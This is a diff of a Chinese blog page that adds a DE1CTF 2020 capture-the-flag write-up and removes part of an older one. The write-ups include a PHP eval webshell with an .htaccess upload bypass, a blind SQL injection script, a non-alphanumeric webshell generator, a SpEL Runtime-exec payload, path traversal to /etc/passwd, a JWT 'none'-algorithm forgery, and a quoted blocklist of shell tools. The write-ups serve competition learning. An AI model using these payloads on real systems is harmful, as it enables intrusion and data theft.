@@ -66,6 +66,448 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-de1ctf2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/05/06/de1ctf2020/" class="article-date">
+  <time class="dt-published" datetime="2020-05-06T07:11:32.852Z" itemprop="datePublished">2020-05-06</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/05/06/de1ctf2020/">de1ctf2020</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="de1ctf-2020"><a href="#de1ctf-2020" class="headerlink" title="de1ctf 2020"></a>de1ctf 2020</h1><h2 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h2><pre><code>perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!</code></pre><p>测试发现：禁止ph结尾后缀，但是可以上传.htaccess</p>
+<p>上传.htaccess</p>
+<pre><code>AddType application/x-httpd-p\
+hp .jpg</code></pre><p>上传test.jpg</p>
+<pre><code class="php">&lt;?=eval($_POST[0]);</code></pre>
+<pre><code>De1ctf{cG1_cG1_cg1_857_857_cgll111ll11lll}</code></pre><h2 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a><strong>mixture</strong></h2><pre><code>index.php
+profile.php
+select.php
+member.php
+admin.php
+logout.php</code></pre><p>除了admin其他用户不会检查密码</p>
+<p>神奇的注释</p>
+<pre><code>index.php:&lt;!------ Include the above in your HEAD tag ----------&gt;
+member.php:&lt;!--orderby--&gt;</code></pre><p>后来学长说member.php的orderby参数可以注入，我是有点不信的，后来想想自己没测出来也是正常的：</p>
+<ol>
+<li>我不知道orderby会将输入放在sql语句的位置</li>
+<li>不知道有没有waf，无法确认waf是否存在</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200505122140.png" alt="image697"></p>
+<p>。。。我应该fuzz一下的</p>
+<p>黑名单：</p>
+<pre><code>if
+union</code></pre><p>最后的payload:</p>
+<pre><code class="sql">http://134.175.185.244/member.php?orderby=AND case when (ASCII(SUBSTRING((SELECT USER()),1,1)))=1 then BENCHMARK(100000,MD5(NOW())) ELSE 2 END</code></pre>
+<p>盲注脚本：</p>
+<pre><code class="python">import requests
+import time
+#修改bigger和sqlinj就好
+
+
+#实现bigger才能使用
+def findByDichotomy(begin,end):
+    max_num=end
+    while True:
+        mid=int((begin+end)/2)
+        if begin==max_num:
+            return False
+        if begin==end:
+            return begin
+        if end-begin==1:
+            if bigger(begin):
+                return end
+            else:
+                return begin
+        if bigger(mid):
+            begin=mid+1
+        else:
+            end=mid
+
+#待求数据大于num
+def bigger(num):
+    return sqlinj(num)
+def less(num):
+    pass
+def equal(num):
+    pass
+
+def sqlinj(num):
+
+    burp0_url = &quot;http://134.175.185.244:80/member.php&quot;
+    param={&quot;orderby&quot;:&quot;AND case when (ASCII(SUBSTRING((select group_concat(table_name) from information_schema.tables where table_schema=database()),{POS},1)))&gt;{GUESS} then BENCHMARK(100000,MD5(NOW())) ELSE 2 END&quot;.format(POS=pos,GUESS=num)}
+    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;p781mlp8a9sp3ggrf1solslvn3&quot;}
+    burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
+    try :
+        requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,params=param,timeout=2)
+    except Exception:
+        return True
+    print(&quot;test &quot;,num)
+    return False
+
+
+result=&quot;&quot;
+pos=len(result)+1
+while True:
+    num=findByDichotomy(32,128)
+    if num is False:
+        print(result)
+        break
+    result+=chr(num)
+    print(result)
+    pos+=1</code></pre>
+<pre><code>member,users
+users:id,username,money
+member:id,username,password
+admin 18a960a3a0b3554b314ebe77fe545c85</code></pre><p>在cmd5上找到密码： goodlucktoyou </p>
+<p>打开admin是一个phpinfo</p>
+<p>search是一个类似文件包含的东东</p>
+<p>但是很多都不行如/etc/passwd等等</p>
+<p>fuzz后得到源码</p>
+<p>select.php</p>
+<pre><code class="php">&lt;?php
+include &quot;profile.php&quot;;
+$search = $_POST[&#39;search&#39;];
+
+if($_SESSION[&#39;admin&#39;]==1){
+    print &lt;&lt;&lt;EOT
+&lt;form class=&quot;form&quot; action=&quot;select.php&quot; method=&quot;post&quot;&gt;
+    &lt;div class=&quot;form-group&quot;&gt;
+        &lt;label for=&quot;disabledTextInput&quot;&gt;You can search anything here!!&lt;/label&gt;&lt;/br&gt;
+        &lt;input type=&quot;text&quot; name=&quot;search&quot; id=&quot;fromgo&quot; class=&quot;form-control&quot;&gt;
+    &lt;/div&gt;
+    &lt;/div&gt;
+    &lt;div class=&quot;form-group&quot;&gt;
+        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;btn btn-info btn-md&quot; value=&quot;submit&quot;&gt;
+    &lt;/div&gt;
+&lt;/form&gt;
+EOT;
+}
+else{
+    print &lt;&lt;&lt;EOT
+  &lt;div class=&quot;container&quot;&gt; 
+      &lt;div class=&quot;row&quot;  &gt;            
+              &lt;div class=&quot;col-md-10 col-md-offset-4&quot;&gt;             
+                &lt;div class=&quot;input-group&quot; display：block;margin：0 auto;&gt;                                                       
+                            &lt;button class=&quot;btn btn-info btn-search &quot; type=&quot;button&quot; &gt;You are not admin or not enough money!&lt;/button&gt;
+                              &lt;/span&gt;
+
+                &lt;/div&gt;&lt;!-- /input-group --&gt;              
+              &lt;/div&gt;&lt;!-- /.col-lg-6 --&gt; 
+      &lt;/div&gt;
+  &lt;/div&gt;
+EOT;
+}
+if($_SESSION[&#39;admin&#39;]==1&amp;&amp;!empty($search)){
+    //var_dump(urldecode($search));
+    Minclude(urldecode($search));
+    //lookup($search);
+}
+</code></pre>
+<p>admin.php</p>
+<pre><code class="php">&lt;?php
+include &quot;profile.php&quot;;
+session_start();
+if(empty($_SESSION[&#39;user&#39;])){
+    header(&quot;location: index.php&quot;);
+}
+if($_SESSION[&#39;admin&#39;]==1){
+    phpinfo();
+}
+else{
+    print &lt;&lt;&lt;EOT
+&lt;div class=&quot;row&quot;&gt;
+  &lt;div class=&quot;col-md-6 col-md-offset-4&quot;&gt;You are not admin!!!!&lt;/div&gt;
+&lt;/div&gt;
+EOT;
+
+}</code></pre>
+<p>member.php</p>
+<pre><code class="php">&lt;?php
+include &quot;profile.php&quot;;
+include &quot;config.php&quot;;
+$orderby = $_GET[&#39;orderby&#39;];
+?&gt;
+
+    &lt;?php
+    print &lt;&lt;&lt;EOT
+&lt;div class=&quot;table-responsive&quot;&gt;
+    &lt;table class=&quot;table&quot;&gt;
+        &lt;!--orderby--&gt;
+        &lt;caption&gt;ALLmember&lt;/caption&gt;
+        &lt;thead&gt;
+        &lt;tr&gt;
+            &lt;th&gt;id&lt;/th&gt;
+            &lt;th&gt;username&lt;/th&gt;
+            &lt;th&gt;money&lt;/th&gt;&lt;/tr&gt;
+        &lt;/thead&gt;
+        &lt;tbody&gt;
+EOT;
+    if(!empty($orderby)){
+        $blacklist = &quot;/if|desc|sleep|rand|updatexml|\^|union|\|\||&amp;&amp;|regexp|exp|extractvalue|length|hex/i&quot;;
+        if(preg_match($blacklist, $orderby))
+            exit(&quot;No~~hacker!&quot;);
+        $sql = &quot;SELECT * FROM users order by id &quot;.$orderby;
+        $result = $mysqli-&gt;query($sql);
+        if($result===false){
+            $sql=&quot;SELECT * FROM users&quot;;
+        }
+    }
+    else{
+        $sql = &quot;SELECT * FROM users&quot;;
+    }
+        $result = $mysqli-&gt;query($sql);
+        /* free result set */
+        while($row = $result-&gt;fetch_row()){
+            //var_dump($row);
+            print &lt;&lt;&lt;EOT
+        &lt;tr&gt;
+            &lt;td&gt;$row[0]&lt;/td&gt;
+            &lt;td&gt;$row[1]&lt;/td&gt;
+            &lt;td&gt;$row[2]&lt;/td&gt;&lt;/tr&gt;
+        &lt;tr&gt;
+EOT;
+        }
+        $result-&gt;free();
+        $mysqli-&gt;close();
+    print &lt;&lt;&lt;EOT
+      &lt;/tbody&gt;
+  &lt;/table&gt;
+&lt;/div&gt;
+EOT;</code></pre>
+<p>index.php</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+include &quot;config.php&quot;;
+session_start();
+if(!empty($_SESSION[&#39;user&#39;])){
+    header(&quot;location: /profile.php&quot;);
+}
+    session_start();
+    $username = $_POST[&#39;username&#39;];
+    $password = $_POST[&#39;password&#39;];
+    if(!empty($username)&amp;&amp;!empty($password)){
+        if($username===&#39;admin&#39;)
+            {
+                $sql = &quot;select password from member&quot;;
+                $result = $mysqli-&gt;query($sql);
+                $row = $result-&gt;fetch_row();
+                if($row[0]===md5($password)){
+                    $_SESSION[&#39;user&#39;]=&#39;admin&#39;;
+                    $_SESSION[&#39;admin&#39;]=1;
+                    header(&quot;location: /profile.php&quot;);
+                }
+                else{
+                    echo &quot;&lt;script&gt;alert(&#39;nononon,admin password not right&#39;)&lt;/script&gt;&quot;;
+                }
+            }
+        else{
+            $_SESSION[&#39;user&#39;]=&#39;guest&#39;;
+            $_SESSION[&#39;admin&#39;]=0;
+            header(&quot;location: /profile.php&quot;);
+        }
+    }
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;title&gt;profile&lt;/title&gt;
+    &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; id=&quot;bootstrap-css&quot;&gt;
+    &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;
+    &lt;style&gt;
+        .fakeimg {
+            height: 200px;
+            background: #aaa;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;!------ Include the above in your HEAD tag ----------&gt;
+&lt;body&gt;
+    &lt;div id=&quot;login&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div id=&quot;login-row&quot; class=&quot;row justify-content-center align-items-center&quot;&gt;
+                &lt;div id=&quot;login-column&quot; class=&quot;col-md-6&quot;&gt;
+                    &lt;div id=&quot;login-box&quot; class=&quot;col-md-19&quot;&gt;
+                        &lt;form id=&quot;login-form&quot; class=&quot;form&quot; action=&quot;index.php&quot; method=&quot;post&quot;&gt;
+                            &lt;h3 class=&quot;text-center text-info&quot;&gt;Login&lt;/h3&gt;
+                            &lt;div class=&quot;form-group&quot;&gt;
+                                &lt;label for=&quot;username&quot; class=&quot;text-info&quot;&gt;Username:&lt;/label&gt;&lt;br&gt;
+                                &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; class=&quot;form-control&quot;&gt;
+                            &lt;/div&gt;
+                            &lt;div class=&quot;form-group&quot;&gt;
+                                &lt;label for=&quot;password&quot; class=&quot;text-info&quot;&gt;Password:&lt;/label&gt;&lt;br&gt;
+                                &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; class=&quot;form-control&quot;&gt;
+                            &lt;/div&gt;
+                            &lt;div class=&quot;form-group&quot;&gt;
+                                &lt;input type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;btn btn-info btn-md&quot; value=&quot;submit&quot;&gt;
+                            &lt;/div&gt;
+                        &lt;/form&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/body&gt;</code></pre>
+<p>emm,Minclude是什么神奇的东西</p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200505134518.png" alt="image8380"></p>
+<p>fuzz后发现其实是读取内存里的内容</p>
+<p>fuzz得到/readflag,从中可知flag在/flag中</p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200505143547.png" alt="image8517"></p>
+<p>但是要运行的话，那就必须拿到shell,还是说flag在这个程序里</p>
+<p>现有以下几种想法：</p>
+<ol>
+<li>利用/proc/xx/cwd/flag来拿到flag但是，fuzz到10000还没有</li>
+<li>从内存中直接拿到flag(好像不行)</li>
+<li>从程序中拿到flag(不会,也不清楚行不行)</li>
+<li>拿到shell(没思路)</li>
+<li>Minclude有洞（没找到）</li>
+</ol>
+<p>再见</p>
+<p>em？</p>
+<p><code>../../../../../../../../../../../../../../../../../../../../../../../etc/passwd</code></p>
+<p>这样也能读取文件，有没有机会文件包含？</p>
+<h2 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a><strong>Hard_Pentest_1</strong></h2><pre><code class="php">&lt;?php
+//Clear the uploads directory every hour
+highlight_file(__FILE__);
+$sandbox = &quot;uploads/&quot;. md5(&quot;De1CTF2020&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;]);
+@mkdir($sandbox);
+@chdir($sandbox);
+
+if($_POST[&quot;submit&quot;]){
+    if (($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 2048) &amp;&amp; Check()){
+        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0){
+            die($_FILES[&quot;file&quot;][&quot;error&quot;]);
+        }
+        else{
+            $filename=md5($_SERVER[&#39;REMOTE_ADDR&#39;]).&quot;_&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];
+            move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $filename);
+            echo &quot;save in:&quot; . $sandbox.&quot;/&quot; . $filename;
+        }
+    }
+    else{
+        echo &quot;Not Allow!&quot;;
+    }
+}
+
+//内容限制：preg_match(&#39;/[a-z0-9;~^`&amp;|]/is&#39;,$file_content)==false 
+//后缀限制：不能为：php，不包含..
+
+function Check(){
+    $BlackExts = array(&quot;php&quot;);
+    $ext = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);
+    $exts = trim(end($ext));
+    $file_content = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);
+
+    if(!preg_match(&#39;/[a-z0-9;~^`&amp;|]/is&#39;,$file_content)  &amp;&amp; 
+        !in_array($exts, $BlackExts) &amp;&amp; 
+        !preg_match(&#39;/\.\./&#39;,$_FILES[&quot;file&quot;][&quot;name&quot;])) {
+          return true;
+    }
+    return false;
+}
+?&gt;
+
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;upload&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;
+    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;
+&lt;/form&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre>
+<p>第一步绕过后缀名：.phP</p>
+<p>第二步绕过文件内容：</p>
+<pre><code class="php">&lt;?php
+$a = &#39;A&#39;;
+$b = &#39;SYSTEM&#39;;//$b = &#39;readfile&#39;;
+$c = &quot;POST&quot;;
+$vv = &#39;__&#39;;
+$v = &#39;_&#39;;
+function fuck($b){
+    $data = &#39;&#39;;
+    $a = &#39;A&#39;;
+    $vv = &#39;__&#39;;
+    $v = &#39;_&#39;;
+    for ($i = 0; $i &lt; strlen($b); $i++) {
+        if (ord($b[$i]) &gt;= ord(&#39;a&#39;) &amp;&amp; ord($b[$i]) &lt;= ord(&#39;z&#39;)) {
+            $data .= &#39;($&#39; . $v . &#39;=$____),&#39;;
+            for ($a = ord(&#39;a&#39;); $a &lt; ord($b[$i]); $a++) {
+                $data .= &#39;($&#39; . $v . &#39;++),&#39;;
+            }
+        } else if (ord($b[$i]) &gt;= ord(&#39;A&#39;) &amp;&amp; ord($b[$i]) &lt;= ord(&#39;Z&#39;)) {
+            $data .= &#39;($&#39; . $v . &#39;=$___),&#39;;
+            for ($a = ord(&#39;A&#39;); $a &lt; ord($b[$i]); $a++) {
+                $data .= &#39;($&#39; . $v . &#39;++),&#39;;
+            }
+        } else {
+            $data .= &#39;$&#39; . $v . &#39;=&quot;&#39; . $b[$i] . &#39;&quot;;&#39;;
+        }
+        $data .= &#39;($&#39; . $vv . &#39;.=$&#39; . $v.&#39;),&#39;;
+    }
+    return $data;
+}
+$a=&#39;&lt;?=[($_=[]),($_=@&quot;$_&quot;),($___=$_[(&quot;!&quot;!=&quot;!&quot;)]),($____=$_[(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quot;)]),&#39;.fuck($b).&#39;$_____=$__]?&gt;&#39;;//system
+$a.=&#39;&lt;?=[($__=&quot;_&quot;),($_=[]),($_=@&quot;$_&quot;),&#39;.fuck($c).&#39;$_]?&gt;&#39;;//_POST
+$a.=&#39;&lt;?=[($_____($$__[_]))]?&gt;&#39;;
+echo $a;
+</code></pre>
+<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><pre><code>GET /spel/calc?calc=&#39;1&#39;%2b&#39;1&#39; =&gt; 11
+GET /spel/calc?calc=&#39;1&#39;.length  {&quot;timestamp&quot;:&quot;2020-05-05T07:23:42.244+0000&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1008E: Property or field &#39;length&#39; cannot be found on object of type &#39;java.lang.String&#39; - maybe not public or not valid?&quot;,&quot;path&quot;:&quot;/spel/calc&quot;}</code></pre><p>谷歌一段时间后发现这里使用spel(Spring 表达式语言  Spring Expression Language )来计算的</p>
+<p>黑名单：<code>getClass,String,#,new,T(,reader</code></p>
+<pre><code>&#39;&#39;.class.forName(&#39;java.l&#39;%2b&#39;ang.Ru&#39;%2b&#39;ntime&#39;).getMethod(&#39;ex&#39;%2b&#39;ec&#39;,&#39;&#39;.class)</code></pre><p>原本想那shell的后来看到OpenRASP,想想还是直接读取文件方便一点</p>
+<p>构造payload:</p>
+<p><code>neW+java.io.RandomAccessFile(&#39;/flag&#39;,&#39;r&#39;).readLine()</code></p>
+<p>SpEL中除了java.lang下的类，其他的类在实例化的是否需要完整的包名</p>
+<p>flag:<code>De1CTF{NobodyKnowsMoreThanTrumpAboutJava}</code></p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/05/06/de1ctf2020/">http://blog.ccreater.top/2020/05/06/de1ctf2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/05/06/de1ctf2020/" data-id="cka3ckr2p001xv4v03kj693i4" data-title="de1ctf2020" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
     <article id="post-maven学习笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/05/05/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-date">
@@ -4316,473 +4758,6 @@ for i in may_r:
 
 
   
-    <article id="post-2020数字中国创新大赛-虎符网络安全" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="article-date">
-  <time class="dt-published" datetime="2020-04-20T02:39:54.120Z" itemprop="datePublished">2020-04-20</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">2020数字中国创新大赛-虎符网络安全</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-login"><a href="#easy-login" class="headerlink" title="easy_login"></a>easy_login</h3><p>在static/js/app.js中发现</p>
-<pre><code class="javascript">/**
- *  或许该用 koa-static 来处理静态文件
- *  路径该怎么配置？不管了先填个根目录XD
- */</code></pre>
-<p>于是直接访问app.js</p>
-<pre><code class="javascript">const Koa = require(&#39;koa&#39;);
-const bodyParser = require(&#39;koa-bodyparser&#39;);
-const session = require(&#39;koa-session&#39;);
-const static = require(&#39;koa-static&#39;);
-const views = require(&#39;koa-views&#39;);
-
-const crypto = require(&#39;crypto&#39;);
-const { resolve } = require(&#39;path&#39;);
-
-const rest = require(&#39;./rest&#39;);
-const controller = require(&#39;./controller&#39;);
-
-const PORT = 80;
-const app = new Koa();
-
-app.keys = [crypto.randomBytes(16).toString(&#39;hex&#39;)];
-global.secrets = [];
-
-app.use(static(resolve(__dirname, &#39;.&#39;)));
-
-app.use(views(resolve(__dirname, &#39;./views&#39;), {
-  extension: &#39;pug&#39;
-}));
-
-app.use(session({key: &#39;sses:aok&#39;, maxAge: 86400000}, app));
-
-// parse request body:
-app.use(bodyParser());
-
-// prepare restful service
-app.use(rest.restify());
-
-// add controllers:
-app.use(controller());
-
-app.listen(PORT);
-console.log(`app started at port ${PORT}...`);</code></pre>
-<p>然后rest.js</p>
-<pre><code class="javascript">module.exports = {
-    APIError: function (code, message) {
-        this.code = code || &#39;internal:unknown_error&#39;;
-        this.message = message || &#39;&#39;;
-    },
-    restify: () =&gt; {
-        const pathPrefix = &#39;/api/&#39;;
-        return async (ctx, next) =&gt; {
-            if (ctx.request.path.startsWith(pathPrefix)) {
-                ctx.rest = data =&gt; {
-                    ctx.response.type = &#39;application/json&#39;;
-                    ctx.response.body = data;
-                };
-                try {
-                    await next();
-                } catch (e) {
-                    ctx.response.status = 400;
-                    ctx.response.type = &#39;application/json&#39;;
-                    ctx.response.body = {
-                        code: e.code || &#39;internal_error&#39;,
-                        message: e.message || &#39;&#39;
-                    };
-                }
-            } else {
-                await next();
-            }
-        };
-    }
-};</code></pre>
-<p>controller.js</p>
-<pre><code class="javascript">const fs = require(&#39;fs&#39;);
-
-function addMapping(router, mapping) {
-    for (const url in mapping) {
-        if (url.startsWith(&#39;GET &#39;)) {
-            const path = url.substring(4);
-            router.get(path, mapping[url]);
-        } else if (url.startsWith(&#39;POST &#39;)) {
-            const path = url.substring(5);
-            router.post(path, mapping[url]);
-        } else {
-            console.log(`invalid URL: ${url}`);
-        }
-    }
-}
-
-function addControllers(router, dir) {
-    fs.readdirSync(__dirname + &#39;/&#39; + dir).filter(f =&gt; {
-        return f.endsWith(&#39;.js&#39;);
-    }).forEach(f =&gt; {
-        const mapping = require(__dirname + &#39;/&#39; + dir + &#39;/&#39; + f);
-        addMapping(router, mapping);
-    });
-}
-
-module.exports = (dir) =&gt; {
-    const controllers_dir = dir || &#39;controllers&#39;;
-    const router = require(&#39;koa-router&#39;)();
-    addControllers(router, controllers_dir);
-    return router.routes();
-};</code></pre>
-<p>fuzz controllers目录得到</p>
-<p>api.js</p>
-<pre><code class="javascript">const crypto = require(&#39;crypto&#39;);
-const fs = require(&#39;fs&#39;)
-const jwt = require(&#39;jsonwebtoken&#39;)
-
-const APIError = require(&#39;../rest&#39;).APIError;
-
-module.exports = {
-    &#39;POST /api/register&#39;: async (ctx, next) =&gt; {
-        const {username, password} = ctx.request.body;
-
-        if(!username || username === &#39;admin&#39;){
-            throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);
-        }
-
-        if(global.secrets.length &gt; 100000) {
-            global.secrets = [];
-        }
-
-        const secret = crypto.randomBytes(18).toString(&#39;hex&#39;);
-        const secretid = global.secrets.length;
-        global.secrets.push(secret)
-
-        const token = jwt.sign({secretid, username, password}, secret, {algorithm: &#39;HS256&#39;});
-
-        ctx.rest({
-            token: token
-        });
-
-        await next();
-    },
-
-    &#39;POST /api/login&#39;: async (ctx, next) =&gt; {
-        const {username, password} = ctx.request.body;
-
-        if(!username || !password) {
-            throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);
-        }
-
-        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;
-
-        const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;
-
-        console.log(sid)
-
-        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {
-            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
-        }
-
-        const secret = global.secrets[sid];
-
-        const user = jwt.verify(token, secret, {algorithm: &#39;HS256&#39;});
-
-        const status = username === user.username &amp;&amp; password === user.password;
-
-        if(status) {
-            ctx.session.username = username;
-        }
-
-        ctx.rest({
-            status
-        });
-
-        await next();
-    },
-
-    &#39;GET /api/flag&#39;: async (ctx, next) =&gt; {
-        if(ctx.session.username !== &#39;admin&#39;){
-            throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);
-        }
-
-        const flag = fs.readFileSync(&#39;/flag&#39;).toString();
-        ctx.rest({
-            flag
-        });
-
-        await next();
-    },
-
-    &#39;GET /api/logout&#39;: async (ctx, next) =&gt; {
-        ctx.session.username = null;
-        ctx.rest({
-            status: true
-        })
-        await next();
-    }
-};</code></pre>
-<p>view.js</p>
-<pre><code class="javascript">module.exports = {
-    &#39;GET /&#39;: async (ctx, next) =&gt; {
-        ctx.status = 302;    
-        ctx.redirect(&#39;/home&#39;);
-    },
-    &#39;GET /login&#39;: async (ctx, next) =&gt; {
-        if(ctx.session.username) {
-            ctx.status = 302;    
-            await ctx.redirect(&#39;/home&#39;);
-        } else {
-            await ctx.render(&#39;login&#39;);
-            await next();
-        }
-    },
-    &#39;GET /register&#39;: async (ctx, next) =&gt; {
-        if(ctx.session.username) {
-            ctx.status = 302;    
-            await ctx.redirect(&#39;/home&#39;);
-        } else {
-            await ctx.render(&#39;register&#39;);
-            await next();
-        }
-    },
-    &#39;GET /home&#39;: async (ctx, next) =&gt; {
-        if(!ctx.session.username) {
-            ctx.status = 302;    
-            await ctx.redirect(&#39;/login&#39;);
-        } else {
-            await ctx.render(&#39;home&#39;, {
-                username: ctx.session.username,
-            });
-            await next();
-        }
-    }
-};</code></pre>
-<p>阅读代码发现：</p>
-<pre><code class="javascript">
-const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;
-if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {
-            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
-        }
-const secret = global.secrets[sid];
-//验证之前</code></pre>
-<p>我们可以控制sid来选择任意的密钥</p>
-<p> node 的jsonwebtoken库存在一个缺陷，也是jwt的常见攻击手法，当用户传入jwt secret为空时 jsonwebtoken会采用algorithm none进行解密 </p>
-<p>我们令<code>sid=false</code>,则可以通过</p>
-<pre><code>if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) {
-            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
-        }</code></pre><p>的验证，且<code>global.secrets[sid]=undefined</code></p>
-<p>最后的payload</p>
-<pre><code class="python">import jwt
-import json
-a=json.loads(&#39;&#39;&#39;{
-        &quot;secretid&quot;: false,
-        &quot;username&quot;:&quot;admin&quot;,
-        &quot;password&quot;: &quot;admin&quot;,
-        &quot;iat&quot;: 1587310401
-}&#39;&#39;&#39;)
-print(jwt.encode(a, key=&quot;&quot;, algorithm=&#39;none&#39;))</code></pre>
-<h3 id="just-escape"><a href="#just-escape" class="headerlink" title="just_escape"></a>just_escape</h3><pre><code>数学运算
-code: (2+6-7)/3
-
-run online: /run.php?code=(2%2b6-7)/3;
-
-Ouput: 0.3333333333333333
-
-注意编码 =.=
-
-时间戳
-code: new Date();
-
-run online: /run.php?code=new%20Date();
-
-Ouput: Fri Nov 22 2019 15:39:22 GMT+0800 (China Standard Time)
-
